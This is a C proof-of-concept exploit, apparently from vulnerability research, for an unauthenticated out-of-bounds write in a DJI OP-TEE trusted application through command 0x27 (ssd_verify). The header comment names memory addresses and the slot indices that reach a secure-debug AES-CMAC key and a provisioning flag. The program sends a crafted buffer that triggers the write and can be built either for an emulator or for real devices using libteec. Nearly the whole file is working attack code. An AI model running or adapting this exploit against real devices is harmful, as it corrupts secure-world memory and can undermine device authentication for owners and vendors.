/*
 * Normal-world PoC for DJI OP-TEE TA e91c9402-64a0-470f-88e7-bf5d3c606b6a
 * BUG 1 (writeup ★, critical): unauthenticated CA-controlled out-of-bounds
 * write via cmd 0x27 (ssd_verify) -> ssd_save_info_to_memory (TA+0x1ac).
 *
 *   case 0x27 requires only:  paramTypes == TEEC_MEMREF_TEMP_INPUT (==5)
 *                             param0.size == 0x6d
 *   The handler reads a 16-bit slot index straight out of the CA buffer:
 *       idx = *(uint16_t *)(param0.buffer + 1);          // 0..0xFFFF
 *   then, on the RPMB-miss path (taken for any unprovisioned idx -> no auth),
 *   indexes a fixed 32-entry global array with NO bounds check:
 *       if (ssd_info_ptr_array[idx] == 0)                // <-- OOB at idx>=32
 *           ssd_info_ptr_array[idx] = malloc(0x6e);      // primitive (A)
 *       memcpy(ssd_info_ptr_array[idx], param0.buffer, 0x6d);   // primitive (B)
 *       *(u8 *)(slot + 0x6d) = status;
 *
 *   ssd_info_ptr_array lives at 0x129c30 (Ghidra base 0x100000). Forward of
 *   it sit security-critical secure-world globals/heap, e.g.:
 *       0x129ee0  16-byte derived AES-CMAC key (secure-debug auth)  -> idx 86
 *       0x129ef8  onetime_enable_flag (provisioning gate)           -> idx 89
 *       0x129f30  ta_heap (32 KB)                                   -> idx 96+
 *
 * No secrets, no signing keys, no prior provisioning needed: just an open
 * session and one InvokeCommand. This is unauthenticated secure-world memory
 * corruption reachable from a normal-world CA.
 *
 * Build/run against the taemu emulator:
 *     make emulator        # gcc -DEMULATE
 *     # emulator already running:  python3 -m emulate --tee optee rootfs/<uuid>.ta
 *     ./poc [slot_index]   # default 0xFFFF
 *
 * On a real device, build with the OP-TEE client (libteec) instead of -DEMULATE.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define TA_UUID        "e91c9402-64a0-470f-88e7-bf5d3c606b6a"
#define CMD_SSD_VERIFY 0x27
#define SSD_INFO_SIZE  0x6d          /* required param0.size for case 0x27 */
#define SSD_NUM_SLOTS  32            /* real bound the TA fails to enforce  */
#define IDX_OFFSET     1             /* idx = *(u16 *)(buffer + 1)          */

/*
 * Drive cmd 0x27 with an out-of-bounds slot index. The handler validates only
 * paramTypes and size, then trusts our 16-bit index against a 32-entry array.
 */
static TEEC_Result trigger_ssd_verify_oob(TEEC_Session *session, uint16_t idx)
{
    /* param0 is MEMREF_TEMP_INPUT — its contents live in CA shared memory and
     * are fully attacker-controlled (and the source of the OOB write data). */
    uint8_t buf[SSD_INFO_SIZE];
    memset(buf, 0x41, sizeof(buf));              /* 'AAAA...' filler payload */
    buf[0] = 0x00;                               /* subcommand byte          */
    buf[IDX_OFFSET]     = (uint8_t)(idx & 0xff); /* attacker slot index, LE   */
    buf[IDX_OFFSET + 1] = (uint8_t)(idx >> 8);
    memcpy(buf + 3, "PWN!", 4);                  /* recognizable marker bytes */

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);   /* == 5 */
    op.params[0].tmpref.buffer = buf;
    op.params[0].tmpref.size   = SSD_INFO_SIZE;

    printf("[*] InvokeCommand cmd=0x%x paramTypes=0x%lx size=0x%x slot_idx=%u (0x%x)\n",
           CMD_SSD_VERIFY, (unsigned long)op.paramTypes, SSD_INFO_SIZE, idx, idx);
    if (idx >= SSD_NUM_SLOTS) {
        long off = 0x129c30 + (long)idx * 8;     /* ssd_info_ptr_array[idx]  */
        printf("    -> OOB: ssd_info_ptr_array[%u] targets secure global 0x%lx "
               "(array bound is %u)\n", idx, off, SSD_NUM_SLOTS);
    }

    uint32_t eo = 0;
    TEEC_Result res = TEEC_InvokeCommand_impl(session, CMD_SSD_VERIFY, &op, &eo);
    printf("[*] InvokeCommand returned 0x%08x (err_origin 0x%x)\n", res, eo);
    return res;
}

int main(int argc, char **argv)
{
    /* Default to the maximal index: ssd_info_ptr_array[0xFFFF] is ~512 KB past
     * the 32-entry array, well outside any mapped secure region, so the missing
     * bounds check manifests as a secure-world data abort (the emulator reports
     * UC_ERR_READ_UNMAPPED inside ssd_save_info_to_memory @ TA+0x1ac).
     * Pass a smaller index (e.g. 86 = the AES-CMAC key, or any value >= 32) to
     * exercise the stealthy controlled-write primitive into a named global. */
    uint16_t idx = 0xFFFF;
    if (argc > 1)
        idx = (uint16_t)strtoul(argv[1], NULL, 0);

    TEEC_UUID *uuid = optee_uuid(TA_UUID);
    TEEC_Context context;
    TEEC_Session session;
    uint32_t eo = 0;
    TEEC_Result res;

    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed 0x%x\n", res);
        return 1;
    }

    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &eo);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed 0x%x origin 0x%x\n", res, eo);
        TEEC_FinalizeContext_impl(&context);
        return 1;
    }
    printf("[+] session opened to %s\n", TA_UUID);

    res = trigger_ssd_verify_oob(&session, idx);

    /* If the OOB write aborted the secure world the session is already gone;
     * tear down best-effort. */
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    printf("[+] done\n");
    return 0;
}
